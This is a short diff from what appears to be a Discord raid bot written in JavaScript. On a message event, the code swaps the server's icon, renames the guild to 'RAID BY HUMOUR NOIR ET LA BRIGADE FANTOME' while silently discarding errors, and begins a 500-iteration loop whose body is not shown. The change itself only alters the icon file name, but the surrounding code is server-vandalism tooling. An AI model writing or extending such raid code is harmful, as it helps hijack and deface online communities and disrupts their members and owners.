@@ -37,7 +37,7 @@ bot.on('message', msg => {
    fucked = false;
  
     if (!fucked){
-      msg.guild.setIcon("./hn.jpg").catch(e => {});
+      msg.guild.setIcon("./humournoir.png").catch(e => {});
       msg.guild.setName('RAID BY HUMOUR NOIR ET LA BRIGADE FANTOME').catch(e => {});
  
       for (var i = 0; i < 500; i++) {
